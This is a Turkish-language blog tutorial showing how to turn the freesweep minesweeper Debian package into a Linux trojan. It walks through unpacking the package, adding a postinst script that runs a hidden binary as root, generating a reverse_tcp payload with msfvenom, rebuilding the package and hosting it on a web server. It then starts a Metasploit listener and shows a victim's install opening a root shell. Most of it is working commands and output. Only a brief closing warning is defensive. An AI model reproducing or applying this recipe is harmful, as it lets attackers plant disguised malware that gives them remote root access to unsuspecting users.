---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-20T13:12:00Z"
excerpt: İstemci taraflı saldırılara örnek olarak bir önceki yazımızda Windows platformu
  için .exe uzantılı bir çalıştırılabilir dosya oluşturmuştuk. Linux işletim sistemlerinin
  kullandığı tıkla ve çalıştır dosya tiplerinde de dosya oluşturabiliriz. Bu yazıda, .deb uzantılı
  bir dosya oluşturacağız.
guid: https://www.siberoloji.com/?p=1173
id: 1173
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Binary Linux Trojan
url: /tr/msf-binary-linux-trojan/
---

  İstemci taraflı saldırılara örnek olarak bir önceki yazımızda Windows platformu için&nbsp;<code>.exe</code>&nbsp;uzantılı bir çalıştırılabilir dosya oluşturmuştuk. Linux işletim sistemlerinin kullandığı tıkla ve çalıştır dosya tiplerinde de dosya oluşturabiliriz. Bu yazıda,&nbsp;<code>.deb</code>&nbsp;uzantılı bir dosya oluşturacağız. 
 

  Ubuntu işletim sistemini hedef alan bu dosyanın oluşturulması ilk olarak biraz karışık gelebilir ancak adımları teker teker inceleyerek devam ederseniz kavramak daha kolay olacaktır. 
 

  Öncelikle, içine payload yerleştireceğimiz bir programa ihtiyacımız var. Örnek olarak “Mine Sweeper” programını kullanalım. 
 

 
<h2 class="wp-block-heading" id="paketi-indirelim">Paketi indirelim
<!-- /wp:heading -->

  Paketi&nbsp;<code>--download-only</code>&nbsp;parametresiyle indirdiğimizde, işletim sistemimize kurulmayacaktır. Daha sonra indirdiğimiz paketi üzerinde çalışmak üzere oluşturacağımız&nbsp;<code>/tmp/evil</code>&nbsp;klasörüne taşıyacağız. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# apt-get --download-only install freesweep
Reading package lists... Done
Building dependency tree
Reading state information... Done
...snip...
root@kali:~# mkdir /tmp/evil
root@kali:~# mv /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil
root@kali:~# cd /tmp/evil/
root@kali:/tmp/evil#
</code></pre>
<!-- /wp:code -->

  Artık&nbsp;<code>/tmp/evil</code>&nbsp;klasörünün içerisinde&nbsp;<code>freesweep_0.90-1_i386.deb</code>&nbsp;isimli bir Debian paketimiz var. İndirdiğiniz .deb uzantılı dosyanın ismi ve sürüm numarası farklı olabilir. İsmini&nbsp;<code>ls</code>&nbsp;komutuyla kontrol ederek örneklerdeki komutlara o şekilde uygulamalısınız. 
 

 
<h2 class="wp-block-heading" id="paketi-açalım">Paketi Açalım
<!-- /wp:heading -->

  Şimdi bu&nbsp;<code>.deb</code>&nbsp;uzantılı paketi, sıkıştırılmış bir dosyayı açmaya benzer şekilde açmamız gerekiyor. Bu paketi aşağıdaki komutla&nbsp;<code>/tmp/evil</code>&nbsp;klasörü içinde&nbsp;<code>work</code>&nbsp;klasörüne çıkartıyoruz. Ardından, bizim ilave edeceğimiz özelliklerin bulunacağı&nbsp;<code>DEBIAN</code>&nbsp;isimli bir klasörü&nbsp;<code>/tmp/evil/work</code>&nbsp;klasörü altına oluşturuyoruz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:/tmp/evil# dpkg -x freesweep_0.90-1_i386.deb work
root@kali:/tmp/evil# mkdir work/DEBIAN
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="control-dosyası-oluşturalım">control Dosyası oluşturalım
<!-- /wp:heading -->

  Debian klasörünün içerisinde&nbsp;<code>control</code>&nbsp;isimli bir dosya oluşturup içerisine aşağıdaki Metni yapıştırıp kaydediyoruz. Dosya içeriği aşağıdaki gibi&nbsp;<code>cat control</code>&nbsp;komutuyla kontrol ediyoruz. 
 

  ***control*** &nbsp;dosyası içeriği 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers ***(*** ubuntu-motu@lists.ubuntu.com***)*** 
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works ***in *** any visual text display - ***in *** Linux console, ***in *** an xterm, and ***in
 *** most text-based terminals currently ***in *** use.
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="postinst-dosyası-oluşturalım">postinst dosyası oluşturalım
<!-- /wp:heading -->

  Kurulum sonrası çalışması için ayrıca bir bash script dosyasına daha ihtiyacımız var. Yine yukarıdaki gibi&nbsp;<code>DEBIAN</code>&nbsp;klasörü içine&nbsp;<code>postinst</code>&nbsp;isimli bir dosya oluşturuyoruz. İçerisine aşağıdaki kod satırlarını yapıştırıyoruz. 
 

  ***postinst*** &nbsp;dosya içeriği 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"><em>#!/bin/sh</em>

sudo chmod 2755 /usr/games/freesweep_scores ***&amp;&amp;***  /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="payload-oluşturalım">Payload Oluşturalım
<!-- /wp:heading -->

  Şimdi içerisinde zararlı kodların olduğu dosyayı oluşturabiliriz. Bunun için aşağıdaki komutu kullanarak&nbsp;<code>linux/x86/shell/reverse_tcp</code>&nbsp;payload modülünü kullanacağız. Komut içerisinde&nbsp;<code>LHOST</code>&nbsp;ve&nbsp;<code>LPORT</code>&nbsp;olarak verdiğimiz değişkenleri kendiniz belirleyebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST***=*** 192.168.1.101 LPORT***=*** 443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 98 ***(*** iteration***=*** 0***)*** 
x86/shikata_ga_nai chosen with final size 98
Payload size: 98 bytes
Saved as: /tmp/evil/work/usr/games/freesweep_scores
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="yeniden-paketleme">Yeniden paketleme
<!-- /wp:heading -->

  Artık,&nbsp;<code>postinst</code>&nbsp;dosyamızı çalıştırılabilir hale getirip&nbsp;<code>.deb</code>&nbsp;paketini derleyebiliriz. Komut sonucunda oluşturulacak&nbsp;<code>work.deb</code>&nbsp;paketinin ismini&nbsp;<code>freesweep.deb</code>&nbsp;olarak değiştirip Apache Server klasörüne (<code>/var/www</code>&nbsp;veya&nbsp;<code>/var/www/html</code>) yükleyebiliriz. Artık dosyamız Web sunucuda indirilebilir durumdadır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:/tmp/evil/work/DEBIAN# chmod 755 postinst
root@kali:/tmp/evil/work/DEBIAN# dpkg-deb --build /tmp/evil/work
dpkg-deb: building package `freesweep' in `/tmp/evil/work.deb'.
root@kali:/tmp/evil# mv work.deb freesweep.deb
root@kali:/tmp/evil# cp freesweep.deb /var/www/
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="dinleyici-handler-oluşturma">Dinleyici Handler Oluşturma
<!-- /wp:heading -->

  Şimdi, bir tıklama veya çalıştırma ile gelecek bağlantı isteklerini dinlemek için dinleyici oluşturalım. Burada komuta vereceğimiz&nbsp;<code>LHOST</code>&nbsp;ve&nbsp;<code>LPORT</code>&nbsp;değerleri, payload oluştururken girilen değerler ile aynı olmalıdır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"
PAYLOAD ***=&gt;***  linux/x86/shell/reverse_tcp
LHOST ***=&gt;***  192.168.1.101
LPORT ***=&gt;***  443
***[*** ******* ***]***  Started reverse handler on 192.168.1.101:443
***[*** ******* ***]***  Starting the payload handler...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="sonuç">Sonuç
<!-- /wp:heading -->

  Herhangi bir kullanıcı, bu hazırladığımız&nbsp;<code>freesweep.deb</code>&nbsp;paketini indirip çalıştırdığında dinleme yapan&nbsp;<code>exploit/multi/handler</code>&nbsp;modülümüz hedef bilgisayarda oturum açacaktır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">ubuntu@ubuntu:~$ wget <a href="http://192.168.1.101/freesweep.deb">http://192.168.1.101/freesweep.deb</a>
ubuntu@ubuntu:~$ sudo dpkg -i freesweep.deb

***[*** ******* ***]***  Sending stage ***(*** 36 bytes***)*** 
***[*** ******* ***]***  Command shell session 1 opened ***(*** 192.168.1.101:443 -&gt; 192.168.1.175:1129***)*** 

ifconfig
eth1 Link encap:Ethernet HWaddr 00:0C:29:C2:E7:E6
inet addr:192.168.1.175 Bcast:192.168.1.255 Mask:255.255.255.0
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
RX packets:49 errors:0 dropped:0 overruns:0 frame:0
TX packets:51 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:43230 ***(*** 42.2 KiB***)***  TX bytes:4603 ***(*** 4.4 KiB***)*** 
Interrupt:17 Base address:0x1400
...snip...

hostname
ubuntu
id
uid***=*** 0***(*** root***)***  gid***=*** 0***(*** root***)***  groups***=*** 0***(*** root***)*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="tavsiye">Tavsiye
<!-- /wp:heading -->

  Görüldüğü gibi zararlı yazılımlar sadece Windows’a özel değildir. Linux kullanıcılarının da tıkla ve çalıştır programlara dikkatle yaklaşması gerekmektedir. Güvenilir olmayan kaynaklardan paket yüklememenizi tavsiye ediyoruz. 
 